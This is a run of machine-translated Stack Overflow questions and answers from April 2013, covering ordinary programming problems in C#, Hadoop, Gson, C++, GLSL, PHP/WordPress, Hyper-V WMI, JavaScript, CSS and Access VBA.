# c# - 在具有许多同名类的 5MB 程序集上运行 sgen

> ID：15750760
> 
> 赞同：0
> 
> 时间：2013-04-01T19:56:52.693
> 
> 标签：c#, xmlserializer, sgen

我正在尝试为输出 5MB dll 的项目生成 XmlSerializers 程序集。该项目有许多具有不同 .Net 命名空间但名称相同的类，因此 sgen 返回错误消息“命名空间中的顶部 XML 元素 'XXXX' 引用不同的类型 XXXX 和 XXXX。

因此，我将 TypeName 属性添加到每个重复类的 XmlTypeAttribute 中。问题是，每次我运行 SGEN 命令时，至少需要 15 分钟才能显示任何反馈。

你有什么建议吗？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T22:30:04.953

sgen 是一个单线程工具，它分两个阶段运行——首先，它生成序列化程序集的源代码，第二阶段它编译生成的程序集。

如果您将类分离并编译成几个程序集（等于 CPU 内核的数量），为每个程序集并行运行 sgen，然后使用 ILMerge 将生成的 dll 合并到一个 xml 序列化程序中，那么您可能会获得一些性能提升。

# hadoop - 使用 java org.apache.hadoop.util.RunJar 命令运行 hadoop 作业

> ID：15750761
> 
> 赞同：1
> 
> 时间：2013-04-01T19:56:54.773
> 
> 标签：hadoop

我想使用 java（而不是 hadoop）向 jobtracker 提交作业，以便调试类路径问题。

```
export HADOOP_CLASSPATH=hbase-util-0.0.1-SNAPSHOT.jar:/etc/hadoop/conf:hbase-util-0.0.1-SNAPSHOT.jar:/usr/lib/hadoop/*:/usr/lib/hadoop/lib/*:/usr/lib/hadoop-mapreduce/*:/usr/lib/hbase/*:/usr/lib/hadoop/etc/hadoop/mapred-site.xml:/usr/lib/zookeeper/zookeeper.jar:/usr/lib/hadoop-0.20-mapreduce/lib/hadoop-fairscheduler-2.0.0-mr1-cdh4.0.1.jar:/usr/lib/hbase/hbase-0.92.1-cdh4.0.1-security.jar:/usr/lib/hbase/lib/zookeeper.jar:/usr/lib/hbase/lib:/etc/hbase/conf:/usr/lib/hbase/lib/guava-11.0.2.jar:/usr/lib/hbase/lib/jackson-mapper-asl-1.5.5.jar:/usr/lib/hbase/lib/jackson-core-asl-1.5.5.jar:/usr/lib/hbase:/usr/lib/hadoop/lib/*:/usr/lib/hadoop/.//*:/usr/lib/hadoop-hdfs/./:/usr/lib/hadoop-hdfs/lib/*:/usr/lib/hadoop-hdfs/.//*:/usr/lib/hadoop-yarn/lib/*:/usr/lib/hadoop-yarn/.//*:/usr/lib/hadoop-0.20-mapreduce/./:/usr/lib/hadoop-0.20-mapreduce/lib/*:/usr/lib/hadoop-0.20-mapreduce/.//*

java -cp ${HADOOP_CLASSPATH}  org.apache.hadoop.util.RunJar hbase-util-0.0.1-SNAPSHOT.jar hbase.util.RowDiffCounter  SRM hdfs://dchilcmsnn01:8020/tmp/hadoop/mapred/temp/job1-temp-1491763074 /tmp/hadoop/mapred/temp/job1-temp-1491763075D SOURCE_MANAGEMENT  SOURCE_MANAGEMENT 
```

我收到一个错误

错误 [main] (UserGroupInformation.java:1235) - PriviledgedActionException as:devuser (auth:SIMPLE) 原因：java.io.IOException：无法初始化集群。请检查您的配置以获取 mapreduce.framework.name 和相应的服务器地址。

添加以下属性没有帮助。我检查了 jobtracker 上的作业配置页面以获得正确的值。

```
 -D mapreduce.framework.name=local
 -D mapred.job.tracker=host101:8021 
```

我还需要传递用户信息吗？

# gson - 使用 Gson 将 JsonArray 序列化为数组而不是对象

> ID：15750765
> 
> 赞同：2
> 
> 时间：2013-04-01T19:57:07.613
> 
> 标签：gson, arrays

我正在使用 Gson 库，但是当它序列化 JsonArray 对象时，它似乎将其序列化为对象而不是 JSON 数组。IE

{ 元素：[ {name:"value1}, {name:"value2"}]}

如何从序列化中删除元素？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-03T05:42:26.290

我去看了医生，因为我走路的时候脚疼。医生说：“不要在上面行走。”

通常，在使用像 Gson 这样的 API 时，人们宁愿不知道它的`JsonArray`存在，他们宁愿只使用 API 的数据绑定部分。`JsonArray`因此，与其`List`手动构建`Gson.toJson()`. 例如：

```
List list = new ArrayList();
list.add("one");
list.add(2);
list.add(new Foo());

Gson gson = new Gson();
String json = gson.toJson(list);
System.out.println(json); 
```

如果该方法不符合您的需求并且`JsonArray`由于某种原因您被困住了，那么您可能会想只调用它的`toString()`方法，因为目前确实创建了最终想要的方法，我不会使用它，因为有文档中没有任何内容`toString()`可以保证创建封闭数组内容的有效 JSON 表示。因此，它可能不会`String`在 Gson 的未来版本中返回相同格式的 a。

无论如何，如果你真的想使用 JsonArray，它应该足够好地序列化，如下所示。

```
JsonElement one = new JsonPrimitive("one");
JsonElement two = new JsonPrimitive(2);
JsonObject foo = new JsonObject();
foo.addProperty("foo", new Foo().foo);

JsonArray jsonArray = new JsonArray();
jsonArray.add(one);
jsonArray.add(two);
jsonArray.add(foo);

System.out.println(new Gson().toJson(jsonArray));
// ["one",2,{"foo":"hi"}] 
```

注意：此答案基于 Gson 2.2 API。我不记得早期版本的 Gson 是否包含重载`toJson(JsonElement)`方法。

如果该`toJson`方法已经以这种方式使用（序列化 a `JsonArray`），但输出如原始问题中所示，请回想一下，Java 在重载方法中进行选择时不会考虑运行时类型。它绑定到编译时类型。（蹩脚——我知道。）因此，您可能需要将参数类型转换为`JsonElement`，让编译器知道要绑定到哪个方法。以下演示了原始问题中可能有效发生的情况。

```
System.out.println(new Gson().toJson((Object)jsonArray));
// {"elements":["one",2,{"foo":"hi"}]} 
```

# javascript - 判断物体是否有焦点的方法

> ID：15750767
> 
> 赞同：0
> 
> 时间：2013-04-01T19:57:12.507
> 
> 标签：javascript, html

是否有确定 html 对象是否具有焦点的方法？我知道存在 document.hasFocus 来确定文档是否具有焦点，但据我所知，这并没有扩展到文档中的对象（例如，我尝试 document.getElementById("thing").hasFocus 没有成功） .

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T20:01:22.813

使用`document.activeElement`（成员，而不是方法）。

[http://jsfiddle.net/FVDdQ/](http://jsfiddle.net/FVDdQ/)

# java - 恢复java derby数据库备份

> ID：15750768
> 
> 赞同：0
> 
> 时间：2013-04-01T19:57:14.323
> 
> 标签：java, netbeans, derby

我是 derby 数据库的新手，我正在尝试使用 apache 教程中的代码恢复 derby 数据库的备份。但是，无论何时我运行代码，它都会给出一个错误，即找不到适合 derby 的驱动程序。

以下是代码片段：

```
public void restoreDatabase() 

  {
     try { 
            String dbURL = "jdbc:derby:/localhost:1527/NSS_DB;restoreFrom="
                    + "c:/mybackups/2013-03-31/NSS_DB";
         Connection  conn = DriverManager.getConnection(dbURL);
           conn.close();
    System.out.println("restore wassuccessful  ");
        } catch (SQLException ex) {
            Logger.getLogger(MyJFrame.class.getName()).log(Level.SEVERE, null, ex);
        }
    } 
```

修改代码后，我不再收到错误，但备份没有恢复。下面是对上述代码的修改。这是第二个代码片段。

```
 public void restoreDatabase() throws ClassNotFoundException
    {
     try {
            String dbURL = "jdbc:derby://localhost:1527/NSS_DB;restoreFrom="
                    + "c:/mybackups/2013-03-31/NSS_DB";
         Connection  conn = null;
         Properties props = new Properties();
         props.put("user", uName);
         props.put("password", uPass);
         conn = DriverManager.getConnection(dbURL, props);        
         conn.commit();
        } catch (SQLException ex) {
            Logger.getLogger(MyJFrame.class.getName()).log(Level.SEVERE, null, ex);
        }
    } 
```

我想唯一的补充是使用 java.util.Properties 对象。

来自 Netbeans 控制台的此错误消息是由第一个代码片段产生的

```
Apr 01, 2013 8:39:25 PM my.gnssregsitry.DBSearch restoreDatabase
SEVERE: null
java.sql.SQLException: No suitable driver found for jdbc:derby:/localhost:1527/NSS_DB;restoreFrom=c:/mybackups/2013-03-31/NSS_DB
    at java.sql.DriverManager.getConnection(DriverManager.java:604)
    at java.sql.DriverManager.getConnection(DriverManager.java:243)
    at my.gnssregsitry.DBSearch.restoreDatabase(DBSearch.java:242)
    at my.gnssregsitry.MyJFrame.jButton2ActionPerformed(MyJFrame.java:929)
    at my.gnssregsitry.MyJFrame.access$1900(MyJFrame.java:41)
    at my.gnssregsitry.MyJFrame$20.actionPerformed(MyJFrame.java:591)
    at javax.swing.AbstractButton.fireActionPerformed(AbstractButton.java:2018)
    at javax.swing.AbstractButton$Handler.actionPerformed(AbstractButton.java:2341)
    at javax.swing.DefaultButtonModel.fireActionPerformed(DefaultButtonModel.java:402)
    at javax.swing.DefaultButtonModel.setPressed(DefaultButtonModel.java:259)
    at javax.swing.plaf.basic.BasicButtonListener.mouseReleased(BasicButtonListener.java:252)
    at java.awt.Component.processMouseEvent(Component.java:6505)
    at javax.swing.JComponent.processMouseEvent(JComponent.java:3321)
    at java.awt.Component.processEvent(Component.java:6270)
    at java.awt.Container.processEvent(Container.java:2229)
    at java.awt.Component.dispatchEventImpl(Component.java:4861)
    at java.awt.Container.dispatchEventImpl(Container.java:2287)
    at java.awt.Component.dispatchEvent(Component.java:4687)
    at java.awt.LightweightDispatcher.retargetMouseEvent(Container.java:4832)
    at java.awt.LightweightDispatcher.processMouseEvent(Container.java:4492)
    at java.awt.LightweightDispatcher.dispatchEvent(Container.java:4422)
    at java.awt.Container.dispatchEventImpl(Container.java:2273)
    at java.awt.Window.dispatchEventImpl(Window.java:2719)
    at java.awt.Component.dispatchEvent(Component.java:4687)
    at java.awt.EventQueue.dispatchEventImpl(EventQueue.java:723)
    at java.awt.EventQueue.access$200(EventQueue.java:103)
    at java.awt.EventQueue$3.run(EventQueue.java:682)
    at java.awt.EventQueue$3.run(EventQueue.java:680)
    at java.security.AccessController.doPrivileged(Native Method)
    at java.security.ProtectionDomain$1.doIntersectionPrivilege(ProtectionDomain.java:76)
    at java.security.ProtectionDomain$1.doIntersectionPrivilege(ProtectionDomain.java:87)
    at java.awt.EventQueue$4.run(EventQueue.java:696)
    at java.awt.EventQueue$4.run(EventQueue.java:694)
    at java.security.AccessController.doPrivileged(Native Method)
    at java.security.ProtectionDomain$1.doIntersectionPrivilege(ProtectionDomain.java:76)
    at java.awt.EventQueue.dispatchEvent(EventQueue.java:693)
    at java.awt.EventDispatchThread.pumpOneEventForFilters(EventDispatchThread.java:244)
    at java.awt.EventDispatchThread.pumpEventsForFilter(EventDispatchThread.java:163)
    at java.awt.EventDispatchThread.pumpEventsForHierarchy(EventDispatchThread.java:151)
    at java.awt.EventDispatchThread.pumpEvents(EventDispatchThread.java:147)
    at java.awt.EventDispatchThread.pumpEvents(EventDispatchThread.java:139)
    at java.awt.EventDispatchThread.run(EventDispatchThread.java:97) 
```

看起来还有更多工作要做，代码正在实现任何 siggestions

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T00:27:52.320

没有合适的驱动程序问题意味着：（a）您必须将 derbyclient.jar 放入您的类路径中，并且（b）您可能必须调用 Class.forName( "org.apache.derby.jdbc.ClientDriver" );

另外，“localhost”前面应该有两个斜杠；它应该是“jdbc:derby://localhost:1527/NSS_DB;restoreFrom=...”等。

# c++ - 随机生成的数字从低到高排序

> ID：15750769
> 
> 赞同：-3
> 
> 时间：2013-04-01T19:57:15.510
> 
> 标签：c++

这是我的代码：

```
#include <iostream>
#include <time.h>
#include <cstdlib>
using namespace std;

int main()
{
    srand((unsigned) time(0));
    int random_integer;
    int lowest =- 10, highest = 10;
    int range = (highest-lowest) + 1;
    for(int index = 0; index < 20; index++) {
        random_integer = lowest+int(range*rand()/(RAND_MAX + 1.0));
        cout << random_integer << ' ';
    }

    cout << "\n=============== \n";
    system("pause"); 
} 
```

如何对计算机将生成的数字进行排序并将它们从低到高排列，然后打印出第二高的数字？谢谢你。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-01T19:59:21.773

有两个选项 - 记住 a 中所有生成的数字`std::vector`，然后调用`std::sort`它并打印第二个数字。这在内存和时间上都是次优的。

第二个（也是首选）选项是记住临时变量中最小的两个数字，并在生成后续随机数时调整它们。（或使用`std::partial_sort`，但在这种情况下这似乎有点过分了）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T20:01:47.973

不要直接在`for`循环中打印数字，而是将数字添加到[`std::vector<>`](http://www.cplusplus.com/reference/vector/vector/). 然后你可以调用[`std::sort()`](http://www.cplusplus.com/reference/algorithm/sort/)对向量进行排序。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-01T20:03:47.283

您应该考虑使用`<algorithm>`来帮助您在向量中创建随机数，然后简单地对向量进行排序：

```
#include <algorithm>
#include <vector>

int myRandomFunction() {
   ...
}

/* Preallocate some space */
std::vector<int> values(100);
std::algorithm::generate(values.begin(), values.end(), myRandomFunction);
std::sort(values.begin(), values.end()); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-01T20:03:58.653

`vector`你可以使用and来做这样的事情`sort()`：

```
#include <iostream>
#include <time.h>
#include <cstdlib>
#include <vector>
#include <algorithm>

using namespace std;
int main()
{
    vector<int> v;
    srand((unsigned)time(0));
    int random_integer;
    int lowest=-10, highest=10;
    int range=(highest-lowest)+1;
    for(int index=0; index<20; index++){
        random_integer = lowest+int(range*rand()/(RAND_MAX + 1.0));
        v.push_back(random_integer);
        //cout << random_integer << ' ';
    }
    sort(v.begin(),v.end());
    cout << endl << v[v.size()-2] << endl;

    cout<<"\n=============== \n";
    system("pause"); 
} 
```

这只是打印第二高的数字：

```
#include <iostream>
#include <time.h>
#include <cstdlib>
#include <algorithm>

using namespace std;
int main()
{

    srand((unsigned)time(0));
    int random_integer;
    int lowest=-10, highest=10;
    int a=lowest,b=lowest;
    int range=(highest-lowest)+1;
    for(int index=0; index<20; index++){
        random_integer = lowest+int(range*rand()/(RAND_MAX + 1.0));
        cout << random_integer << ' ';
        if(a<random_integer) 
        {
            a=random_integer;
            continue;
        }
        if(b<random_integer) 
        {
            b=random_integer;
            continue;
        }
        //cout << random_integer << ' ';
    }
    cout << endl << min(a,b) << endl;

    cout<<"\n=============== \n";
    system("pause"); 
} 
```

# php - 如何在 CakePHP 中实现发送 JSON

> ID：15750773
> 
> 赞同：-1
> 
> 时间：2013-04-01T19:57:32.043
> 
> 标签：php, json, cakephp

我必须创建网页进行测试，但我不知道如何实现它的逻辑（因为我不想破坏 MVC）。它将在 CakePHP 中创建。

我想做的基本事情是，演示者操作将有一个参数（JSON 对象或 JSON 字符串），并且基于此参数，将在视图内创建一个测试表单。用户提交答案后，它将作为参数（JSON 对象或字符串的类型）发送到我的 PHP 算法。该算法将返回另一个 JSON 对象，该对象将用作上述演示者操作的参数。

我不知道如何实现这种发送和接收 JSON 的逻辑，以免破坏 MVC 规则。请给我解释一下。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T09:02:03.950

首先要做的是考虑你的设计。

控制器可以处理您的数据并返回 JSON 响应，因此您需要使用它。幸运的是，蛋糕有这个内置的。读一读这本书，[http://book.cakephp.org/2.0/en/views/json-and-xml-views.html](http://book.cakephp.org/2.0/en/views/json-and-xml-views.html)

如果您将 JSON 传递给您的控制器，您只需从请求中提取它。您可以通过在控制器中调试请求来找到它。`debug($this->request)`.

然后你可以在你的控制器中处理 JSON，做一些事情并返回一个 JSON 响应。

# jquery - 检查表行数时代码不起作用

> ID：15750777
> 
> 赞同：0
> 
> 时间：2013-04-01T19:57:35.757
> 
> 标签：jquery

当用户按下搜索按钮时，我正在尝试计算搜索结果表中的行数。我这样做是为了清除表中以前的搜索结果（如果有的话）。

但是，代码不起作用。当用户按下搜索时没有任何反应。如果我删除或注释掉代码，那么它工作正常。

这是我的导致问题的代码：

```
 var rowCount = $(this + " tr").length;
            if (rowCount > 1) {
                alert("true");
                $(this + " tr").remove();
            }
            ...go on to populate table with search results.... 
```

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T19:59:03.543

您不应该将对象与字符串连接，选择器将是`"[object Object] tr"`，`$('selector', context)`而是使用：

```
var rowCount = $("tr", this).length; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-01T19:59:25.773

尝试

`$(this).find("tr")`

代替

`$(this + " tr")`

# c++ - GLSL布局std140填充困境

> ID：15750788
> 
> 赞同：5
> 
> 时间：2013-04-01T19:58:28.377
> 
> 标签：c++, opengl, glsl, uniform

我有以下统一缓冲区：

```
layout(std140) uniform Light
{
    vec4  AmbientLight;
    vec4  LightIntensity;
    vec3  LightPosition;
    float LightAttenuation;
}; 
```

在缓冲数据和需要添加的填充时，我遇到了一些问题。我已经阅读了[http://ptgmedia.pearsoncmg.com/images/9780321552624/downloads/0321552628_AppL.pdf](http://ptgmedia.pearsoncmg.com/images/9780321552624/downloads/0321552628_AppL.pdf)，其中说我必须在 vec3 的末尾添加额外的 4 个字节用于填充 - 所以我将总共上传 13 个“光”的字节。然而，当我这样做时，'LightAttenuation' 会得到我在'LightPosition' 上填充的值，而不是提前一个字节，所以当我不填充时，我会在着色器中得到正确的值。为什么是这样？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-04-01T21:09:14.670

有关详细信息，请参阅 OpenGL 规范的第 7.6.2.2 节，但基本上，`std140`布局表示每个变量将立即布置在前一个变量之后，并为变量类型所需的对齐添加足够的填充。 `vec3` 并且`vec4`都需要 16 字节对齐，分别是 12 和 16 字节。 `float`需要 4 字节对齐并且有 4 字节大小。因此，对于`std140`布局，`LightPosition`将获得 16 字节对齐，因此将始终以 12 mod 16 的地址结束。由于这是 4 字节对齐的，因此不会在之前插入额外的填充`LightAttenuation`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T20:56:14.557

通常是的，openGL 会将 vec3 视为 vec4。但在这种情况下，AFAIK 将浮动 LightAttenuation 附加到 vec3 LightPosition - 形成整体 vec4（它的某种优化，由 glsl 编译器完成）。整个结构的大小将是 3x vec4。

尝试使用 vec3 或 vec4 进行 LightAttenuation。

# java - 强制 JVM 抢先加载和初始化类以减少延迟？

> ID：15750789
> 
> 赞同：0
> 
> 时间：2013-04-01T19:58:28.663
> 
> 标签：java, performance, jvm, classloader

在一个大型 Java 桌面应用程序中，我是一名开发人员，我注意到，当您刚刚启动该程序时，大多数 GUI 功能和操作在您第一次激活它们时会有一点延迟。再次单击相同的功能，它会立即生效。我目前的假设是以下一个或多个运行时操作会导致这种效果（据我所知，大致按从最可能到最不可能的顺序）：

*   从磁盘加载 .class 文件（或从 JAR 中解压缩它们）
*   类字节码验证
*   字节码的JIT编译
*   类静态初始化

如果该程序对所有内容都具有可爱的活泼感觉，而不仅仅是您已经至少单击过一次的按钮，那显然会更好。所以，我的问题是：

1.  我如何判断这些操作中的哪一个（或者可能是我没有想到的其他一些操作）是主要影响因素？我知道如何使用 VisualVM 进行 CPU 和堆分析，但我不知道如何分析像这样的半隐藏 JVM 因素。
2.  假设上述操作是造成这种延迟的原因，减少它的一种方法可能是让低优先级的后台线程运行程序中的所有类和最常用的库，并反射性地触摸它们以强制它们被类加载和初始化。理想情况下，它会首先接触常用的类，然后将不常用的类放到该过程的后期。这是一个好主意吗？
3.  如果是这样，是否有人已经写过这样做的东西？
4.  如果没有，实现它的最简单方法是什么？

# php - 如何在php中检查当前的url，然后比较它是否有一个特定的单词/短语

> ID：15750792
> 
> 赞同：0
> 
> 时间：2013-04-01T19:58:35.723
> 
> 标签：php, wordpress, redirect

基本上，我创建了一个函数，如果用户尝试直接访问[http://example.com/wp-longin.php](http://example.com/wp-longin.php) ，该函数会重定向用户。

下面的功能有效。
问题是我已将 wp-login.php 的 URL 从[http://example.com/wp-login.php](http://example.com/wp-login.php)更改为[http://example.com/here](http://example.com/here)

```
function access_granted(){
     global $pagenow;
     if(!isset($_GET['action']) && 'wp-login.php' == $pagenow ) {
      wp_redirect('http://example.com/');
      exit();
     }
    } 
```

我的问题是，有没有办法只在它包含“here”时检查url，并确保它包含“action”或者使用php重定向回家？

使这变得困难的原因是我在functions.php文件中有这个，因为我不想编辑核心wp文件。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T20:17:45.427

您可以检查`$_SERVER['REQUEST_URI']`以确定当前的 URI。

`$_SERVER`注意：如果您的脚本应该可以从命令行运行，请不要依赖条目。

来源： http: [//php.net/manual/en/reserved.variables.server.php](http://php.net/manual/en/reserved.variables.server.php)

# c# - 使用特定硬件创建新的 Hyper-V VM（使用 WMI）

> ID：15750793
> 
> 赞同：2
> 
> 时间：2013-04-01T19:58:37.133
> 
> 标签：c#, wmi, virtual-machine, hyper-v

我想创建一个具有确定数量的 RAM、网卡、处理器内核数量的新 Hyper-V VM，并将 VHD 文件附加到 IDE 控制器。

问题是它`Msvm_ResourceAllocationSettingData`不是很容易使用。我使用的代码不起作用（这是将 VHD 附加到现有 VM 的代码，但我也想在创建新 VHD 时使用它）。

```
public void AttachVhd(IdeChannel ideChannel, String vhdPath) {

        // Get VirtualSystemSettingData
        ManagementObject vssd = this.GetVirtualSystemSettingData();

        // Get the IDE Controller
        ManagementObject ideController = this.GetResourceAllocationSettingData(ResourceType.IdeController, ResourceSubType.IdeController);

        // Create synthetic disk:
        ManagementObject syntheticDiskRasd = this.GetResourceAllocationSettingData(ResourceType.Disk, ResourceSubType.DiskSynthetic);
        syntheticDiskRasd["Parent"]  = ideController.Path;
        syntheticDiskRasd["Address"] = ideChannel == IdeChannel.Primary ? "0" : "1";

        this.AddVirtualSystemResources(syntheticDiskRasd);

        // Attach it
        ManagementObject vhdRasd = this.GetResourceAllocationSettingData(ResourceType.StorageExtent, ResourceSubType.Vhd); ;
        vhdRasd["Parent"]     = syntheticDiskRasd.Path;
        vhdRasd["Connection"] = new String[] { vhdPath };

        this.AddVirtualSystemResources( vhdRasd );

        // Cleanup
        vhdRasd.Dispose();
        syntheticDiskRasd.Dispose();
        ideController.Dispose();
        vssd.Dispose();
    }

    private ManagementObject GetResourceAllocationSettingData(ResourceType resourceType, ResourceSubType resourceSubType)
    {
        String desiredSubType = ResourceSubTypeStrings.GetString(resourceSubType); // Scout.Common.Extensions.GetDescription( resourceType );

        using(ManagementObjectCollection settingsDatas = _vm.GetRelated("Msvm_VirtualSystemSettingData"))
        foreach(ManagementObject settingData in settingsDatas)
        {
            using(ManagementObjectCollection rasds = settingData.GetRelated("Msvm_ResourceAllocationSettingData"))
            foreach(ManagementObject rasd in rasds)
            {
                ResourceType rasdResourceType    = (ResourceType)(UInt16)rasd["ResourceType"];
                String       rasdResourceSubType =               (String)rasd["ResourceSubType"];
                String       rasdOtherType       =               (String)rasd["OtherResourceType"];

                if( rasdResourceType == resourceType && rasdResourceSubType == desiredSubType )
                {
                    return rasd;
                }
            }
        }

        return null;
    }

    private void AddVirtualSystemResources(ManagementObject rasd)
    {
        using (ManagementObject vmService = HyperV.GetManagementService())
        {
            ManagementBaseObject inParams = vmService.GetMethodParameters("AddVirtualSystemResources");
            inParams["TargetSystem"]         = _vm;
            inParams["ResourceSettingsData"] = rasd.GetText(TextFormat.CimDtd20);

            ManagementBaseObject outParams = vmService.InvokeMethod("AddVirtualSystemResources", inParams, options: null);

            String[]            addedResources = (String[])outParams["NewResources"];
            OperationReturnCode returnValue    = (OperationReturnCode)(UInt32)outParams["ReturnValue"];

            if (returnValue == OperationReturnCode.JobStarted)
            {
                String jobPath = (String)outParams["Job"];
                HyperV.MonitorJob(jobPath);
            }
            else if (returnValue == OperationReturnCode.Completed)
            {
            }
            else
            {
                throw new ApplicationException( returnValue.ToString() );
            }
        }
    } 
```

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2013-05-11T20:50:14.817

我可以为您指出一个有效的示例，而不是找到您的问题吗？

`WmiCalls.DeployVirtualMachine`在[我的 Apache CloudStack Hyper-V 插件](https://github.com/lafferty/cshv3/blob/master/plugins/hypervisors/hyperv/DotNet/ServerResource/HypervResource/WmiCalls.cs)中查看

如果您需要更多详细信息，请发表评论，我会更新答案。

# javascript - JavaScript 和 IE 的问题

> ID：15750795
> 
> 赞同：0
> 
> 时间：2013-04-01T19:58:47.080
> 
> 标签：javascript

我编写了一个代码，使 div 跟随窗口导航器上的鼠标，这里是代码：

```
 <script type='text/javascript'>
     window.onload = function()
     {
        window.onmousemove = function(event)
        {
           var evento = event || window.event;

           var bloque = document.getElementById('x');
           bloque.style.top = evento.clientY+'px';
           bloque.style.left = evento.clientX+'px';

        }
     }
  </script> 
```

块状

它适用于Firefox，但不适用于IE。它根本不做任何事情。我做错了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T20:05:57.100

```
var isMSIE = /*@cc_on!@*/0;

if (isMSIE) {
  // do IE-specific things
  bloque.style.top = window.event.clientY + document.documentElement.scrollTop + document.body.scrollTop+"px";
  bloque.style.left = window.event.clientX + document.documentElement.scrollLeft + document.body.scrollLeft+"px";

} else {
  // do non IE-specific things
  bloque.style.top = event.clientY + window.scrollY+"px";
  bloque.style.left = event.clientX + window.scrollX+"px";

} 
```

# android - 如何创建可点击的 textView，然后为其分配按钮响应？

> ID：15750800
> 
> 赞同：0
> 
> 时间：2013-04-01T19:59:06.377
> 
> 标签：android, eclipse

我搜索了很多，并没有发现这个问题得到解决：

我有一个读取的 xml 文件，其中包含以下数据的记录：

```
<abbrev> has an abbreviation, potentially from "A", "AAA", "ABC", ... to "ZIT"
<full_name> expands the acronym
<state_name> gives a description of what it is. 
```

我想显示以下内容：

对于出现的每个第一个字母，“A”到“Z”，我创建一个包含该字母的 textView。（此 textView 稍后可点击）。

在每个“首字母标题”下，我创建另一个 textView，并且对于以该字母开头的每条记录，我在记录中插入接下来两个条目的格式化版本，并且 .

我对整个文件都这样做。

我为工作做了这么多。

问题出现在下一步：

然后，我使“首字母标题”文本视图可单击并为它们分配按钮行为。

我遇到了一个双重问题：

从 textView 中制作按钮的代码需要从 R.java 文件中获取 id。

如何为“首字母标题”文本视图分配 id？

这是一个关于将动态设计的 textView 制作为按钮的非常普遍的问题。

我的第一次尝试产生了一条消息，清楚地表明我对 Java 知之甚少（我正在处理来自 Quick-C 的 Java！）：

我被告知“不能在以不同方法定义的内部类中引用非最终变量 letterContentTextViewArray。

我认为你们专业人士甚至不需要代码摘录来告诉我我在哪里......

感谢您的耐心等待。

PS我必须插入代码，有人可以告诉我怎么做吗？

# css - 如何将下拉菜单文本居中？

> ID：15750801
> 
> 赞同：1
> 
> 时间：2013-04-01T19:59:08.380
> 
> 标签：css, wordpress, text, drop-down-menu, center

我是一名学生，正在为一个项目制作一个模拟网站。网址：[http ://www.brightpixelstudios.com](http://www.brightpixelstudios.com)

在“关于”下，您会找到一个下拉菜单。我试图将这个下拉菜单的文本居中，但作为一个 CSS 菜鸟，我很难过。

这是覆盖下拉菜单的模板 CSS：

```
.nav li ul  { background: #fff; margin:5px 0 0; padding:10px 0 0; position: absolute; left: -999em; width: 180px; border: 1px solid #e3e3e3; z-index:9999; }
.nav li ul li { margin:0; }
.nav li ul li a  { padding: 8px 15px; width:150px; color:#666 !important; background: none; font-size:0.8em;}
.nav li ul li a:hover  { font-weight: bold; }
.nav li ul li a.sf-with-ul { padding-right:0; }
.nav li ul ul  { margin: -35px 0 0 170px !important; }

.nav li ul li a:hover, 
.nav li.current_page_item ul li a, 
.nav li.current_page_parent ul li a,
.nav li.current-menu-ancestor ul li a,
.nav li.current-cat a ul li,
.nav li.current-menu-item ul li a,
.nav li.sfHover ul li { background:none;}

.nav li:hover,.nav li.hover  { position:static; }
.nav li:hover ul ul, .nav li.sfhover ul ul,
.nav li:hover ul ul ul, .nav li.sfhover ul ul ul,
.nav li:hover ul ul ul ul, .nav li.sfhover ul ul ul ul { left:-999em; }
.nav li:hover ul, .nav li.sfhover ul,
.nav li li:hover ul, .nav li li.sfhover ul,
.nav li li li:hover ul, .nav li li li.sfhover ul,
.nav li li li li:hover ul, .nav li li li li.sfhover ul  { left:auto; /* margin-left:-50px; */ }

.nav .sf-sub-indicator {background: url(images/arrow-superfish.png) no-repeat;position:absolute;display:block;right:0.4em;top:44%;width:10px;height:10px;text-indent:-999em;overflow:hidden;}
.nav li ul .sf-sub-indicator {background:url(images/arrow-superfish-right.png) no-repeat; top:38%; } 
```

如果有人可以帮助我解决这个问题，我将非常感激。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-01T20:00:39.503

用于`text-align: center;`_`#navigation .nav li ul li a`

它在你的`style.css line 242`

# ms-access - 从 Access 2007 脚本保存自定义导出

> ID：15750802
> 
> 赞同：0
> 
> 时间：2013-04-01T19:59:09.407
> 
> 标签：ms-access, ms-access-2007, vba

您好，感谢您查看我的问题。我正在尝试获取一个脚本来从 Access 2007 数据库中导出一组 excel 电子表格。我的导出和其他功能运行良好，这是导致我出现问题的保存功能。我当前的实现是一个消息框，显示给用户询问文件夹名称。这允许用户输入*现有*文件夹名称以保存到该文件夹​​，但前提是该文件夹*已存在并且位于“我的文档”中*目录。对我来说，这是功能性的，但不完全是我希望我的客户被迫处理的。有没有办法让一个简单的“另存为”或其他默认保存文件对话框出现？我有一个导入脚本在另一端工作，默认文件打开选择器工作，我错过了什么吗？脚本如下：

```
Private Sub btnExport_Click()
On Error GoTo Err_Command38_Click

Dim strPath As String

strPath = InputBox("Enter an existing folder name, or enter a file path.", "Export")       
Beep
MsgBox "Report will now be exported to the " & strPath & " folder in My Documents"
Dim strDocName As String
strDocName = "DatabaseExport" + Date$ + ".xlsx"   'Enter your filename here

DoCmd.SetWarnings False
DoCmd.TransferSpreadsheet acExport, 10, "tblBenefit", strPath + "/" + strDocName, True
DoCmd.TransferSpreadsheet acExport, 10, "tblBenefitDispensation", strPath + "/" +     strDocName, True
DoCmd.TransferSpreadsheet acExport, 10, "tblCourse", strPath + "/" + strDocName, True
DoCmd.TransferSpreadsheet acExport, 10, "tblCourseEnrollment", strPath + "/" + strDocName, True
DoCmd.TransferSpreadsheet acExport, 10, "tblDistinguishedStudent", strPath + "/" + strDocName, True
DoCmd.TransferSpreadsheet acExport, 10, "tblEvent", strPath + "/" + strDocName, True
